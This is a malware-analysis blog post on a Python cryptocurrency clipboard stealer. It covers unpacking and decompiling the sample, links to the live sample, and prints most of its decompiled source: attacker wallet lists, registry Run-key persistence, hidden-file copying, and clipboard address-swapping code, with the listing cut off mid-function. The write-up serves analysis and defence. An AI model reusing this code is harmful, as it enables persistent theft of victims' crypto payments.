---
layout: post
title:  "VolumeInformationUSB.exe/NetFrameworkSvc.exe CryptoStealer Brief Analysis and Decompilation"
date:   2021-04-14
categories: malware
---

# **File Info:**  
**FileName**: [VolumeInformationUSB.exe](/assets/files/VolumeInformationUSB.zip) (password: infected)  
**MD5:**  A4977A10850455F6D3144AA4EA7958A8  
**SHA1:** E1AEECD1A2B049D39E9A25DA67A09453F5283B7C  
**SHA256:** EE0153AAEC5E9A526CE5761A2D48A4EAFF2335F7F04E86B0B6D540E70064E57F  

I came across with this malware several times before, but couldn't find any detailed analysis reports nor brief, so here I am writting one.  
Malware author uses very basic persistence mechanisms and spreading methods (e.g. infecting USB sticks), but the reason I decided to make a brief about this malware was a smart trick
used by author to steal crypto. Briefly, it creates a thread which monitors and parses clipboard data, checks if it contains any crypto wallet address, if so replaces it with authors 
wallet adress (victim copies a valid wallet address, meanwhile pasted address is attackers one).

![Noice](/assets/images/VolumeInformationUSBCryptoStealer/noice.jpg)


Opening the file in **PeStudio** gives us a little hint here in strings section, leading to assumption that the malware is written in python and then compiled as a PE file.

![Python Detected](/assets/images/VolumeInformationUSBCryptoStealer/PEStudioPyStrings.png)


Python malware project can be unpacked using [pyinstxtractor.py](/assets/files/pyinstxtractor.py "Python Project Extractor") script.

Simply running `python pyinstxtractor.py VolumeInformationUSB.exe` command leads to outputting unpacked project files.  
![pyinstxtractor_cmd](/assets/images/VolumeInformationUSBCryptoStealer/pyinstxtractor_cmd.png)  

Extracted files need to be decompiled in order to retrieve malwares original source code. In this case  
* Checker
* pyiboot01_bootstrap
* pyimod01_os_path
* pyimod02_archive
* pyimod_03_importers
* struct  
Files need to be decompiled, also we have to rename those file to \<file_name\>.pyc

![Extracted Project](/assets/images/VolumeInformationUSBCryptoStealer/extracted_project.png)  

We can use uncompyle6 utility to decompile pyc files to original python script (uncompyle6 can be installed simply by running `pip install uncompyle6`)

Running `uncompyle6 Checker.py` results in an error (Unknown magic number).

![Uncompyle6 Error](/assets/images/VolumeInformationUSBCryptoStealer/uncompyle6_error.png)

Error can be resolved by inserting the correct magic number at the very beginning of the file using any hex editor (e.g. Hxd). (Same fix for other pyc files)

![Fixing magic number](/assets/images/VolumeInformationUSBCryptoStealer/fixing_magic_number.png)

Leading to successful decompilation  
![Successful decompilation](/assets/images/VolumeInformationUSBCryptoStealer/decompilation_success.png)

**MY MISSION IS COMPLETE HERE**  
Extracted Code Below  

````
# uncompyle6 version 3.7.4
# Python bytecode 2.7 (62211)
# Decompiled from: Python 3.5.2 (v3.5.2:4def2a2901a5, Jun 25 2016, 22:18:55) [MSC v.1900 64 bit (AMD64)]
# Embedded file name: Checker.py
import shutil, time, sys, os, _winreg, subprocess, threading, base64, random, ctypes
from ctypes import wintypes
import random
ETH = [
 '0xAd91cd6c8B9F80cCF142cb0ceE0055072cBA31C5', '0xa6c3a4a88684B1b73c32B9b9B01054aACb51738b', '0xBDFd1226FEa8dd473fbD41c0A5ce6b3951ced4F7', '0xbb3B59961ba17e79EEF3Cf9c092E6C78A6103C6C', '0xCaf7dF43c1A38B827fD2E9a6dc70D83C7E998002', '0xcc5fD6D52aB89195ee6936450aF71C9BfD132683', '0xDA97e564444Ca1Dcfa772C2B044cc6Ad9E65a360', '0xd5f5cFc9da8e4689115Ce90727844D65612Bcc45', '0xEDDC483D7DF5dee2d1bE3A98672a1e14e72856d9', '0xe7bd405cdE927a2743BCd7e51c3C11Bb216CFBd6', '0xFc830DdC273634BeC051AFDcC7DBeC5061Ee97c9', '0xf4CD47F53C73DeFC079c869295294aE9460D51Cc', '0x048A9572e40e557920712e74A7e1FB91d41d09fC', '0x1FabA5c2BfC9C76a3f29eF5a6a6Ea771ec802235', '0x221B4975F30f0895733BFC05836fE0a8BDDEdbdC', '0x36A0b81B9fd5C066A281D9899f6D12f6BA014E3f', '0x48F801A53b98544141C1B13B3F43670899Fb249c', '0x5f9fc9232419e87f1Dc94c817B12214AC66be70D', '0x6051dB52223E2B2508FC8B2C598628e22A3441a3', '0x7c58a3Ef5204aAbae240A176fB783310c925423b', '0x835a2b57A0F8AaAF6E0194B4e31C573175413909', '0x9b42b2977d266868aA3AbFe5d214C8C123A89Df1']
XMRA = ['4B1bPgnYF7a7ZdRHa5mf3wYzkT3dvsZjpVU5jq87BAntMb3Am6zQZ6iHQtkeETDTxJbJu8yHRaDBKaKajYuKe7wkLDo1qGU']
XMRS = ['8AGnXv4r84k9uQD38BoewBcsFTfMWythNfHSJsMVrQ6nfiF6DvDR91f5eSiB61icwWj936ZtwzPiK8DzimiufpxtU6rzH3m', '82VetiWbr1geUbgKnaiBDsbam2auwK51TGoFN5jDVENdWBepUCVidT72NT62XxcGnU6dQEtnYeZNJ2TXzTyu9pnNMpJGFEQ', '88Um2Ujru6oG4PYPds4GMMa6uQeQQg15vBL9hRAVsf7FFigpwG8uwXzhf8iBjyAipsLFTWpofJex4K1w11XPBE6MB7uvujU', '88MX7zv6AcCNxWHdoF2PQt8Wtx6xn4J6X5Q7Qcxg2VDzQURNr9ffPcMLF6HkuoGeaSVhSZPLVZ4xY2xMdTyr2aJBEjqd7KY', '857XPkDAxKXVYa2nKDYh52ZDxq8d6f5bXj35S3n3g3XbZ8wLhtXapvo3UPanacrrHnSueiDcKrV6HNPx77BEGk8pNVr68bN', '82upfT4sKtFK5DsduBBePqZ56qWpopB5u1D9ZdAgz6Nf8ZRNwvhgH2pXbfDgRiakwQjJZpRxd3p8EjpAHzP4ugmoT7GahUm', '831gFYYuPMJTwpfPHHfdFf1XW2LDSuNQ3U5n7igF4PAa51m1Ydr9qsARcSHVwrmFZZ8qBKdZCf1fp5T5CUuB3Mo71SrA1BW', '87W2aVFPzt9ewcvEiMAbCNbvPm8euwMQEHfrU6xH6d9AjSQfEgGatEE2RkBzzw6SNHeGSuPg8RcCTBTYYvbJrLqSSuDaLhR', '87DuonUwg4QHfJr2uWw9bXcc8VieECQYdUyhui9sTqih64oGrzTWi6uHhxcisJJLvNS6Nuef1t3qyXhd2ZEeQypHPwKy7Ey', '86SxRhftCTZ2SWCJoAnv6yD1XYsz5Gmm8NGpPMWDKVnS1dCJhK2wmDE4EoWa3qqrehS5kR87qTYrz9j3CZHAitjYN4tVGRk', '82jRtudopiY1mhXAK1Nq1RiJeasFpux23j4nZWWbS8onhmQ8RPyQx56ExFQf6VSsQBHF6P3FceGPujnqa2d4i3YUGa2RXha', '886BfaYiUTuZz5KnTjM7Bm8mjy45KQwqYdjbBxijtWrn9R3Qt4v6im4fevW3zAcDKedu5ueix1mYSLekT9YDq31xVJLv16k', '835cNmSsNTtha8D2JBR8jw2JpRcmKsEcc9BMQJ1QSSFk92bz8sGmeHDS5SVxw3BR9dff83DdsJk6ZPTJTZGJPXAVDohsFNw', '84MD8Ehh3ddBxuiebTq7KjahAcFm5qm6QEBJDUU33fXg4WS2JgrrVY9eBud9QSMKGF3tX5LSDpy9fRBRgjL4zkfGD4dpU3K', '87CUjYhi7g7b3gz76wfWiZFVAfh4ve8om7SrEEoLSb7L1yrC51sg8K4cirnzvBdPznhWhozxycr2FSCeUrKb7JhR3RZoS14', '82XPzPDPnXDJuGRn8mheE2N5j9wVDnhUjguPbhJVcyMyX6aj1kSTepB2Cc4iKKUZ3eCdvTrzWBuVYBMV84hpMbdL4wk7U8S', '88MyrnA7gw6BBJcqegdopJMVfgaoR119NSgXec1kmyiU3ud1VLreesT1AVqvtFUWezj5ZXaNH1GTiDH2cQM9Fn4fG8ukVvJ', '87JycS39b8m8wT6gohBPopcTcx189U6rSecKXCDzjRBzMa3wqcWryNQLyr8wHpmZNNftmH5xQpG25iomRpMA1hbK5woP6Ta', '8BkTaUuMeb3bkhByNgTQ5dhGMdvKXENiTWBJ5ByJVo4o7Ykq57YXavqGPRC3HTZrQdQ5rNV2bqjvD228DGKu1vL15kPH9di']
XRP = ['rQNf4TMzh8EfyZpC9SvLhGh4D9o5GH7JCD']
DASH = ['XwnKY19ZKKJw8CxfrzubxuZ3n3FqjgWbn5']
BTC1 = ['1AXQdnb5nionEJLhB94e5aNa8u3MAJt8RG', '1BN2NB98whjgWGrFBoaRU99qogmiHZaLH1', '1CcdFsVqvS2LkviEdgPdBSfn2K8T5SYGnN', '1DPMBDatjMEH6sRA69TyreW6nDsMFsNz52', '1EJRGcqaEEFdZPfBqkoYDGMBHAMMqQU8bW', '1FEqBbSns7DGpWMbt8Yj73tEpeYsyd72eF', '1GGuwQdfN4n2xe7NJhtrKJzkG1X8B5nYNA', '1HyDmTEYuTsVWrZvtmK4hAgzLCm5eueo3m', '1iWSVhsP1kDQDQcwa78WejZJ1U8RLmpnP', '1JewF3c9DoVYLf7AA85YTGC91wQKqETqAo', '1KCgD45FpeJVxrkhHv3wYdYKFUW9yyEdm9', '1L58iSCnU3n58pNigGjnafzNXgnKtv8GYL', '1MYk2zuqwF1BabdRmT9STap6tsTJSErpGb', '1NmxqYxTNLH2uKbC8tW8Ma6DHvwsjXeE2R', '1oLSmSXXfQK8pT9bpetAWXTM1ttQ2Wovf', '1Po47xwHH3R4R4w14AhJQktK1cf4tthMb1', '1QCPxkP9nEbq3LYz5YZF9Z8d9GYSEYw7YF', '1rxNntachDqavTt7H6X7Wzcxtgy6oQEtE', '1stekhxB6dqvDjHhmta7snNJWZSF8Pqnw', '1tZh2GAEABmppn94HkpBJB4upktbavJUT', '1UxKMv6eUffJgVDDhCK7t6HwztQpZwbgM', '1VgqBAbWzgrRGCMbZNzwgDYbs1DRKA3mn', '1WoDR259CZJNrTJJCJtdM5iK6mdJjQPE1', '1XoG4AFk1Loc2wTPhRPFZZyaLmQDj1Jyw', '1ypKmjAvdHDZEQDUUPA9sPzo6rztCXGGK', '1ZupNi6Wy1nD4xXqnyPUfEwvMqyWnFv37', '114zjhVHg2N6FT3GDuAjpWgx8AvS3G966C', '122b1vZknGWGCT3xUEaVrU1x8USZLR8y9C', '13Bzv6YXLUW6uZiXjZRuGmmTdrSNNgYCmp', '144SKtg5BdZaLjrUkRYJZiVW9JsTBX3s8h', '15NeX3Amz23MZF1aJn71vvB1dYNyN4rmED', '16kwB2APJ2u5mwNP52irpjhv4qvdHLqacN', '17KgkuLfTnY6uqYTTKXdxDXWFEvrzyUQoj', '1836JxqzrNoVsTgxiKsTiV7bcavwn27rxW', '19nhGK2cVdyv2HbcgomjdckrTj4FeBT1Qz']
BTC3 = ['3AFgtGcAppYB3ZrYyx6KiXN3UFMbkmS2Bm', '3BqqK3dMeuJwuprQPVSFcJxBCJFR8hsL3w', '3CthLM5JCyA2FdM9iATH1McWburB3mV4ij', '3DFg5vzgmvTaF21ZRKjEABLPx7kXz6sP4F', '3FiKWouFdPsZhryVemfyFokX4d6F9QiqXR', '3GqiBaAbKhYXYvHE1Quu7pCWXwwaLPswLQ', '3HF5UYwBqWNuqLYN22YXMNtBapEYqsGoZ7', '3JH1o3dUPRwBjcfc22utd9yvJyKWCdL88W', '3Ko7skMJgF9dU8j4DdYZdbo4TuBggLR6SD', '3LNsTTK861FphrcdVvAVtiz5gzEfmuJbQg', '3MWHicqQYTLogwHB5SvkZWdCKtzhz1nxVx', '3NLhRZzdeGiPV1w3xpZZF473gJirhw6mZa', '3PaLktnq5hp7Cd3F2NwrYe69U1H4iXZggj', '3QmhMFWYBuf7k7GtmVZtQrL8cSfaTJFzbP', '3R1mLd3eUDzFLXu8SLBJbHpxeXZcTZWjjf', '31qjmU1fUdfc1LjKTdhr3SX23x5ntUDofv', '32tGbVtJeXQEbMUiCkdViaTvoBfxUNyQfZ', '33Fiv6RUvZArjpTN4u9SzJ6sBwzUynBCxG', '34jnRgFCc4v2iFVAAHtWScYWxH9AmfKoaL', '358SHgR7fLesfxmTQJRY9inkNnL7e47NvR', '36NiWXZN8x2mK7jgMkNpgFE2TfrnPefcVL', '37vFjMHXP4XJgyEfSKt7qAQrDcwtmkSUjE', '3846FGDVEXkefA5Csx73zyTEymdWMDb1Lh', '39quXYVnB3Ymk1CCubjL3LW9iy5tHfuQjE']
BTCbc1 = ['bc1qart5sm99839zcn2g8y225nha3zpewzj067sgj3', 'bc1qc8trzhxaejmq27lsllfc85pplp63zchr42aark', 'bc1qdfw9eg6fzn2q2m90qhxfr8h8h2fj34gx02807t', 'bc1qeny3gllggszg2kdgwgd69yeagv9shz2anpvev0', 'bc1qftjnpu6k2gn88sqt6rlqe7k9lxrt7vapm9a7pa', 'bc1qgrzlv8k05xc2rr6knnuh9a00t6dwwgp2rs8vd0', 'bc1qhhr55qk0j9httrugnz9n2u4uqhmtr56tp0vpth', 'bc1qjw2awfkclk4jaq6fwqj8gnnszf07qew0cr25xr', 'bc1qkdhq43fm3x77vshcqyg3mvudxa4k3wppws8uvy', 'bc1qltrjqzlqra9pcf4k67h77ghz94fhf57awhrsxe', 'bc1qmzjn550ypdu6sl54vdk3mqu4mpaqyrt3zlvu8g', 'bc1qngut3l2403f05d0u3jxl0et35p246csl4z2g76', 'bc1qp6v06d233lck360ltxl4j6nu8zv0cfm569se72', 'bc1qrrat4gqgkjfa6fkyjm5fpgjf0exuanw9nw32gj', 'bc1qs3wm4yjp0a5ldchllqyyp8prmxm3dvwkuha94f', 'bc1qt36vhrylxzggskfn2xvmhyutwyu4dtwyy6s0dz', 'bc1quzm3zs69nz9md0ed58hdxfkud7xp5k7h9lepsm', 'bc1qvxu2v85xk26w59eqe3pfxhzqtcz6y2mh6ud44g', 'bc1qwwpprx26sugtcncpvkcp8xn29305pe9tpapvmv', 'bc1qx6ep2jrd8nn84agwqsh3vud2xvp0s9kg8q4a2x', 'bc1qyljlt63hw0kkmhx29f38ekhg5uxvf7drw229mt', 'bc1qzmyhgxmqqs44wn0c7r4lvqc63693t6ru5ktys0', 'bc1q0ngyart0kmp5tlwd3xalzdn4per2rvta85qlua', 'bc1q22xza6wuw3wd6zxrnednmx8fe0fgwshukg8p45', 'bc1q3mv2zaju8ulwgf705e4f49aw5f7dvcxvnsvt37', 'bc1q4qeyp8hkg6y8lc0mgav6zrmu0gneudycgmyt0n', 'bc1q5kr7vkkv0gw6cpl26cgrzkkj2ajfsj6hqxwgpn', 'bc1q6r9k6mzuskl60j74yesn0pndd6k6ftfzzdg2wy', 'bc1q7ykxnqpl99ud0ufvk4xg068hnswjuvelsn3awp', 'bc1q8s8we8aaufwtgpzy8upngnx2hdhn0p8qeeue85', 'bc1q9hm52lp0tdfer09smw095f2qgz0spxrzstwt9y']
BCHindex = ['bitcoincash:qr5vxtuxnn7946rwy45calmh3qllynf0r5vwdptsr6', 'bitcoincash:qqwgsc2z0yelw05fx0mjd3adhwvvehy0auvnxz6p5l', 'bitcoincash:qquy7fvmn792s97x05mjlh9frxar2ufus504q5um0a', 'bitcoincash:qplkvdfyak4agh6ytrjsy2t6pxcydnxjlusevzgful', 'bitcoincash:qp58j4hmh4uxl282tl33zp0g5lvcqlvcks6jk6u95g', 'bitcoincash:qqsz3wlkdy7xe5thuyv5p76vd9f0y574f5u98cq83q', 'bitcoincash:qpfseaq57uxq8nyqfkccrv7a6u9tqunh4gqtt3p93z', 'bitcoincash:qq48zl8693kthfn5ef5g590n3lev787g0qhnrnhzww', 'bitcoincash:qpy9l4n29aqu98dghtgmdthfd90h6cyelq9m2jwcm8', 'bitcoincash:qpvggwlsl09j2d3xsylwhmw3c8yphvhyhv3xmx9hpr', 'bitcoincash:qpc6lzzfltenxw3f83cseugmppwewgjqugdns4pwge', 'bitcoincash:qrquf3vudrxxmu5esz66vlve8tx74pmnl5jl3pups5', 'bitcoincash:qr3jwphmrwn9z3hqtrvm4z9r0cgn8lpvzysjtlwj0s', 'bitcoincash:qr02xy92ulvpycul90ryxh9nh7ue0t9rlsm9e2pj02', 'bitcoincash:qqvjeqjqjrw8yrjv94vn5x2rx7gk6ppnzy3tua7apc', 'bitcoincash:qqzyvsqypx2hv7g4nfxeeyzkd3y5xqcp8uypm0qvmc', 'bitcoincash:qpqgjymavtd2d4avacrlwyu6wzafqu62yc3vy779m0', 'bitcoincash:qp4qcay298km2j5uaqdet8p7ydvv3lsdxudfy4dykr', 'bitcoincash:qq8q5554vynpy2w2gyqnmd746swx5gxrgqpj993jsu', 'bitcoincash:qre62tz90cp3dvmpdkzyagztge63w6gdu595z0402y']
BCHnoindex = ['qr5vxtuxnn7946rwy45calmh3qllynf0r5vwdptsr6', 'qqwgsc2z0yelw05fx0mjd3adhwvvehy0auvnxz6p5l', 'qquy7fvmn792s97x05mjlh9frxar2ufus504q5um0a', 'qplkvdfyak4agh6ytrjsy2t6pxcydnxjlusevzgful', 'qp58j4hmh4uxl282tl33zp0g5lvcqlvcks6jk6u95g', 'qqsz3wlkdy7xe5thuyv5p76vd9f0y574f5u98cq83q', 'qpfseaq57uxq8nyqfkccrv7a6u9tqunh4gqtt3p93z', 'qq48zl8693kthfn5ef5g590n3lev787g0qhnrnhzww', 'qpy9l4n29aqu98dghtgmdthfd90h6cyelq9m2jwcm8', 'qpvggwlsl09j2d3xsylwhmw3c8yphvhyhv3xmx9hpr', 'qpc6lzzfltenxw3f83cseugmppwewgjqugdns4pwge', 'qrquf3vudrxxmu5esz66vlve8tx74pmnl5jl3pups5', 'qr3jwphmrwn9z3hqtrvm4z9r0cgn8lpvzysjtlwj0s', 'qr02xy92ulvpycul90ryxh9nh7ue0t9rlsm9e2pj02', 'qqvjeqjqjrw8yrjv94vn5x2rx7gk6ppnzy3tua7apc', 'qqzyvsqypx2hv7g4nfxeeyzkd3y5xqcp8uypm0qvmc', 'qpqgjymavtd2d4avacrlwyu6wzafqu62yc3vy779m0', 'qp4qcay298km2j5uaqdet8p7ydvv3lsdxudfy4dykr', 'qq8q5554vynpy2w2gyqnmd746swx5gxrgqpj993jsu', 'qre62tz90cp3dvmpdkzyagztge63w6gdu595z0402y']
BTPAY = ['CdgdAHLXY2ANeKmRgG1JXSELKkMuPHE86Z', 'CegAe5BA1YcLitGdqzhZtpAZJoa6RukqTq']
LTCleg = ['LgkGyJ7NjnfDXiGo9QqSLvUJwLVWfaSJn8', 'LZHeLfAcsmiNTiNLQkWwEnwgtPGvsaBzqf', 'LQGnRTZvStZqfDJfnNud4XJWtjZ65BkYS7', 'LbBNTZwq3u2hJ7wEbHQXFJvV6n2qFZHATG', 'LLMaZFTZmKobrAHx5cap17NPPUpprAJoed', 'LRD7oscLGoYAZvGFfx8k8yjiDt9XNYurBb', 'LRSRqbHVTVckLjWEaG11JQMP9Qv5ZB1hxU', 'LdkgJL38a6Gqgr7BCLNEi7eVoBESyAGVUd', 'LgcQgP8wi5FuNXoYZ8qAxZpjNHPWGsmha1', 'LVfCfYb7Wk2cGqW4DqVWhgESRSzuWJEqs7', 'La2TuLucDxARkzEZrU9setjM5UE1QBfvYi', 'LWhneoUEbDh1rdkB9eq4zxe1ux2eB3PTwe', 'LZfFVv9Ke9sb6K317M1jmcdwvvn4KHaZhF', 'LVkcsp3yY3HFsob8WeP8VwukQ2JKaQgCqb', 'LZQRjMYFALjerCzQ2MKgeAyHWPXSewKPgv', 'LfUTZ24ipirVPibfUB1wktWi1SUUyeWd1R', 'Ld3gzZKahdjL5t41F5BJsTkuPPHZJu9BMA', 'LRDa9wSTyXmNvWn6e2DXsJmWiwJfoJMqRk', 'LdD1DxsYYk2L7ivZXwqLYsBPxLP1Cp7Zeq', 'LhB8cZLPH6tXKC75uDh25Qk33R6PTfnoof', 'LdZMNq2w1fLteXK3Empf5UVCYa37yJPD4x', 'LMBv3uccAtZ8RqrLDjAHPHeMprAUK9grE4', 'LKgeSrkHRS8iMYEWPuRa1YPc71TaXch1L1', 'LRs9xLy9HEkQhEsFKW5hRfDkgbW6k5zKJu', 'LLQmn7iT5YULbGEz7khgiCJAGWtgrU7gzD', 'Lb531GvZcEiC8NB4FnPP9XEkV5Go4WYiUZ']
LTCseg = ['MFsFhEUXVJDnZG6dHHdqCs7qviXAbteFSQ', 'MGEgtQyVXNVCxm6Au8BhKyiGUD8Bdx6n83', 'MEMqJkr5N9DMKY8KuCiV4JLLFry3Vt9ckh', 'MRFWPMizeT5h1A6gneDPsCjqGELBN1z62t', 'MX5aeAKbez3eQmDBzEAEb17c4h8PxbdDRU', 'MU3jPVxt33chiXkFSgqJRwJUtg5yywZqdd', 'MQq4C7eayQxj23svLCgCxkGGbKWMpE4sTB', 'MTdQed6RBnNwHQGLg9eU79XaniahHeFeDo', 'MW8YEypo6y6a6phrxmLHSDEFUVwhUzpLH6', 'MMLvSpCS36eUpvTyYSeQ7obkEg2Yt4cSBB', 'ME2Re36ZhDoQWcdmopB36ajrRoxa4fstWc', 'MCFEgnFjfdq4n1eXTa1JvgfGGygdDHY4Fe', 'MHhtNT1pM49yd9vk6ddVHzWnLwo1kWz4aQ', 'MErKMAUuQ5DDFmhKpjpbrY34J4mwkRGGhn', 'MMDkSHwSCT4wxnGm3jCUMQukbQGXiBYZok', 'MERNyhS4UVE37JMgXxwSDjJNnryurY2x7L', 'MEMTd68kC6SLbxUXTPYbQmRDGMWM5MEzX6', 'MV1hUfo7T6c3PD4mKzuCP4BPA28SRe5A55', 'MW9qnJcZeXSa2WWt5658yCuTp9SHW9F5Xk', 'MSYd5VKmvfHYWcaJTDwEd8QNFh8V5wKqrj', 'MRvuXduGYFbqbgFPjZXqRhnSQ5ryWp9HZX', 'MVEhsj2gaTJwG2aGxDKao2ZaYtx6A4w3WL', 'MMG9LcfHTRuG5X4gqqwrWpUbMnFN6gJv5n', 'MVszkMfqmDguzj9TP5f4XK1BS4yjYCAJrA', 'MCxizL2DSAeC1j2JPFAEMFb2gVf4cmECvM', 'M9cASwwMVAaqgktCivh7uhiLvHYFrdbiEE']
LTCsegnat = ['ltc1q646hhl3wjwa6aepu8tm9l3txytqh4rme5tk8ym', 'ltc1quwnx2g508wdhpv7aym6g60addlj7e3w2x4449r', 'ltc1qypn72n9n2jgcnmvuuhcyketf8wwxe55q6x88lr', 'ltc1qkn0pe2h4ct05j9xv4xl59wf8lww5fk3hv43mj5', 'ltc1qvc60ucea6prp8qjplg6j5avxtlqmv6m0t6gdt9', 'ltc1qhlpwqy468maq5hwv624gjznyxqwpg5hur0q8hx', 'ltc1qg7xx24f787cj8jhntytfee3fmmp8pjkdhvy58g', 'ltc1q3yshes226tw6eh4dm9ngckk9f0pmmr4ef9k3ax', 'ltc1qxrwv75328vxey03hfcvfa5aedee0kg93fgunnd', 'ltc1q0nk6rd0qx9rpammlsc77smdw52ppk2tf9j079j', 'ltc1qlmrtk07zsqgk0jvvhruzykqcw329zsv6ej5mr7', 'ltc1qrqdhpdtgyjlgarqtfdm5y27dq7nm9wetrquskt', 'ltc1qs44dc74uy6lpw0pslgzdlueg85czausnu8q2tz', 'ltc1qyhj5h222np4rrp6hapzk4rvf2k5dshj5tkne9k', 'ltc1qk8q65eg73hnuzw5rgelqnd8dsrpxevftkk97sx', 'ltc1qgxpm22h7z9puqlm8ufp5kx9406tps6vthx259y', 'ltc1qn0g0jsn6t6gc5tcw8rsys8j34t06ekwldhhczk', 'ltc1q862zya9fcxvjxt3jclekzgjkunguray0vz8rll', 'ltc1q3jf56s2zeenlps6m8xw0d3s0ck8wyqts6eu5pl', 'ltc1q60w9afaljqna6gs3zlhwwv87qj87333sj2tm26', 'ltc1q53vpayhhd2srhhhk87sde4rtk8svyemkrkhjpw', 'ltc1qvn0ekn92rht52pftp2kneqtdffuc7ky9f9y0hx', 'ltc1q8datuc3wpf5de9xwdh65jcrvsf47kyq5x9px4w', 'ltc1quqmj703ysjldmqcwv852yugl2dh09d750rn7ee', 'ltc1qn8y9dh48ww27lyzn8tzr7j42pdsknqdgcce3rh', 'ltc1q9scpp08u34q70drhj2jtev85vnragps33xrqgt']
BNB = ['bnb14j7923cy7djfd9gg8u8qnr0e6uez3yt5vej6yx']
XLM = ['GBK4W5A3VFJIGCDTO5BV4S6Z5LABUXT7BSOZZCSHZQAIKR7ZDE37JQD5']
Shell32 = ctypes.windll.shell32
Kernel32 = ctypes.windll.kernel32
startupinfo = subprocess.STARTUPINFO()
startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
hidden_folder = os.path.join(os.getcwdu(), unichr(160))
if os.path.exists('VolumeInformation.exe'):
    try:
        os.startfile('VolumeInformation.exe')
    except:
        pass

elif 'VolumeInformationUSB' in sys.argv[0] and os.path.exists(hidden_folder):
    try:
        os.startfile(unichr(160))
    except:
        pass

_SHGetFolderPath = Shell32.SHGetFolderPathW
_SHGetFolderPath.argtypes = [wintypes.HWND, ctypes.c_int, wintypes.HANDLE, wintypes.DWORD, wintypes.LPCWSTR]
path_buf = wintypes.create_unicode_buffer(wintypes.MAX_PATH)
result = _SHGetFolderPath(0, 35, 0, 0, path_buf)
DESTINATION_FOLDER = os.path.join(path_buf.value, 'NetFrameworkSvc')
if not os.path.exists(DESTINATION_FOLDER):
    os.makedirs(DESTINATION_FOLDER)
DESTINATION_PATH = os.path.join(DESTINATION_FOLDER, 'NetFramworkSvc.exe')
CURRENT_PATH = os.path.abspath(sys.argv[0])
if DESTINATION_PATH != CURRENT_PATH:
    if not os.path.exists(DESTINATION_PATH):
        shutil.copy2(CURRENT_PATH, DESTINATION_PATH)
        REG_PATH = 'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run'
        registry_key = _winreg.CreateKey(_winreg.HKEY_LOCAL_MACHINE if Shell32.IsUserAnAdmin() == 1 else _winreg.HKEY_CURRENT_USER, REG_PATH)
        _winreg.SetValueEx(registry_key, 'NetFrameworkSvc', 0, _winreg.REG_SZ, DESTINATION_PATH)
        Kernel32.SetFileAttributesW(DESTINATION_PATH, 2)
    sys.exit(0)
if 'NetFramworkSvc' in sys.argv[0]:
    DESTINATION_OLD_PATH = os.path.join(path_buf.value, 'Intel')
    try:
        subprocess.Popen('taskkill /f /im IntelADTSvc.exe', startupinfo=startupinfo, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
        os.rename(os.path.join(DESTINATION_OLD_PATH, 'IntelADTSvc.exe'), os.path.join(DESTINATION_OLD_PATH, 'update.binx'))
        os.remove(os.path.join(DESTINATION_OLD_PATH, 'update.binx'))
    except:
        pass

def to_unicode(input, encoding='ascii'):
    if isinstance(input, unicode):
        return input
    if isinstance(input, str):
        return unicode(input, encoding)


def to_bytes(input, encoding='utf-8'):
    if isinstance(input, unicode):
        return input.encode(encoding)
    if isinstance(input, str):
        return input


def win32_setup():
    if not hasattr(win32_setup, 'user32'):
        win32_setup.user32 = ctypes.windll.user32
        user32 = win32_setup.user32
        user32.OpenClipboard.argtypes = [ctypes.c_void_p]
        user32.GetClipboardData.restype = ctypes.c_void_p
        user32.SetClipboardData.argtypes = [ctypes.c_uint, ctypes.c_void_p]
        user32.SetClipboardData.restype = ctypes.c_void_p
        user32.GetActiveWindow.restype = ctypes.c_void_p
    if not hasattr(win32_setup, 'kernel32'):
        win32_setup.kernel32 = ctypes.windll.kernel32
        kernel32 = win32_setup.kernel32
        kernel32.GlobalAlloc.argtypes = [ctypes.c_uint, ctypes.c_size_t]
        kernel32.GlobalAlloc.restype = ctypes.c_void_p
        kernel32.GlobalFree.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.argtypes = [ctypes.c_void_p]
        kernel32.GlobalLock.restype = ctypes.c_void_p
        kernel32.GlobalUnlock.argtypes = [ctypes.c_void_p]
    return (
     win32_setup.user32, win32_setup.kernel32)


def win32_get():
    user32, kernel32 = win32_setup()
    data = None
    window = user32.GetActiveWindow()
    user32.OpenClipboard(window)
    if data is None:
        contents = user32.GetClipboardData(13)
        if contents is not None:
            lock = kernel32.GlobalLock(contents)
            data = ctypes.c_wchar_p(contents).value
            kernel32.GlobalUnlock(lock)
    if data is None:
        contents = user32.GetClipboardData(1)
        if contents is not None:
            lock = kernel32.GlobalLock(contents)
            data = to_unicode(ctypes.c_char_p(contents).value, 'ascii')
            kernel32.GlobalUnlock(lock)
    user32.CloseClipboard()
    return data


def win32_set(data):
    user32, kernel32 = win32_setup()
    asciidata = to_bytes(data, 'ascii')
    window = user32.GetActiveWindow()
    user32.OpenClipboard(window)
    user32.EmptyClipboard()
    try:
        win32_set_data(1, asciidata)
    except RuntimeError:
        pass

    user32.CloseClipboard()


def win32_set_data(type, data):
    user32, kernel32 = win32_setup()
    ptr = kernel32.GlobalAlloc(0, len(data) + 1)
    if ptr is not None:
        lock = kernel32.GlobalLock(ptr)
        dataptr = ctypes.c_char_p(data)
        ctypes.memmove(ptr, dataptr, len(data) + 1)
        kernel32.GlobalUnlock(lock)
        res = user32.SetClipboardData(type, ptr)
        if res is None:
            kernel32.GlobalFree(ptr)
            raise RuntimeError('Could not set clipboard data.')
    return


def getSimilarAddress(addr, db=None, level=2):
    for new_addr in db:
        if addr[:level].lower() == new_addr[:level].lower():
            return new_addr

    return random.choice(db)


def alias(addr):
    try:
        db = {'420x': getSimilarAddress(addr, ETH, 3), 
           '954': random.choice(XMRA), 
           '958': random.choice(XMRS), 
           '34r': random.choice(XRP), 
           '34x': random.choice(DASH), 
           '341': getSimilarAddress(addr, BTC1), 
           '343': getSimilarAddress(addr, BTC3), 
           '42bc1q': getSimilarAddress(addr, BTCbc1, 5), 
           '54bitcoincash:q': getSimilarAddress(addr, BCHindex, 14), 
           '54bitcoincash:p': getSimilarAddress(addr, BCHindex, 14), 
           '42q': getSimilarAddress(addr, BCHnoindex, 2), 
           '42p': getSimilarAddress(addr, BCHnoindex, 2), 
           '34c': random.choice(BTPAY), 
           '34l': getSimilarAddress(addr, LTCleg, 2), 
           '34m': getSimilarAddress(addr, LTCseg, 2), 
           '43ltc1q': getSimilarAddress(addr, LTCsegnat, 6), 
           '42bnb': random.choice(BNB), 
           '56g': random.choice(XLM)}
        pattern = str(len(addr)) + addr.lower()
        for k, v in db.items():
